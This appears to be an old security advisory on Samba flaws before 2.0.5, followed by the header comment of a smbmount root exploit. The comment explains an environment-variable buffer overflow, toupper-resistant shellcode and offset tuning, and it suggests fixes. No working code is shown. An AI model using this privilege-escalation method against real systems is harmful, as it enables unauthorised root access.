There were a number of vulnerabilities in the Samba package pre-2.0.5. The first is a possible denial of service in nmbd (the netbios name service daemon), which resulted in nmbd spinning until killed. The second vulnerability known is a possible buffer overflow problem in smbd which is not exploit in the default install/configuration. A function in the messaging system could be exploited and arbitrary code executed as root if the "message command" was set in smb.conf. There was also a race condition vulnerability which could possible allow an attacker to mount arbitrary points in the filesystem if smbmnt was setuid root (which it is not by default).

The default parameters to the program
often work, however I have found that the offset parameter sometimes
varies wildly, values between -600 and -100 usually work though, a quick
shell script will scan through these.

** smbexpl -- a smbmount root exploit under Linux
**
** Author: Gerald Britton <gbritton@nih.gov>
**
** This code exploits a buffer overflow in smbmount from smbfs-2.0.1.
** The code does not do range checking when copying a username from
** the environment variables USER or LOGNAME.  To get this far into
** the code we need to execute with dummy arguments of a server and a
** mountpoint to use (./a in this case).  The user will need to create
** the ./a directory and then execute smbexpl to gain root.  This code
** is also setup to use /tmp/sh as the shell as bash-2.01 appears to
** do a seteuid(getuid()) so /bin/sh on my system won't work.  Finally
** a "-Q" (an invalid commandline argument) causes smbmount to fail when
** parsing args and terminate, thus jumping into our shellcode.
**
** The shellcode used in this program also needed to be specialized as
** smbmount toupper()'s the contents of the USER variable.  Self modifying
** code was needed to ensure that the shellcode will survive toupper().
**
** The quick fix for the security problem:
**          chmod -s /sbin/smbmount
**
** A better fix would be to patch smbmount to do bounds checking when
** copying the contents of the USER and LOGNAME variables.
